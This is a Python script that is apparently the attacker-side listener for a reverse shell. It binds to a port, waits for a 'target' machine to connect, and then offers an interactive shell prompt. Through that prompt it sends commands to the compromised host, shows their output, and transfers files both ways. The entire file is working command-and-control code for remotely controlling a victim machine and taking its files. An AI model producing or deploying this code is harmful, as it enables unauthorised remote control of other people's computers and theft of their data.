import socket
import json
import os
import sys

def reliable_send(data, target_socket):
    jsondata = json.dumps(data)
    target_socket.send(jsondata.encode())

def reliable_recv(target_socket):
    data = ''
    while True:
        try:
            data = data + target_socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name, target_socket):
    with open(file_name, 'rb') as f:
        target_socket.send(f.read())

def download_file(file_name, target_socket):
    with open(file_name, 'wb') as f:
        target_socket.settimeout(1)
        chunk = target_socket.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target_socket.recv(1024)
            except socket.timeout as e:
                break
        target_socket.settimeout(None)

def target_communication(target_socket, ip):
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command, target_socket)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command.startswith('cd '):
            pass
        elif command.startswith('download '):
            download_file(command[9:], target_socket)
        elif command.startswith('upload '):
            upload_file(command[7:], target_socket)
        else:
            result = reliable_recv(target_socket)
            print(result)

if len(sys.argv) != 3:
    print("Usage: python script.py <ip_address> <port>")
    sys.exit(1)

ip_address = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip_address, port))
print(f'[+] Listening on {ip_address}:{port}')
sock.listen(5)
target_socket, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication(target_socket, ip)
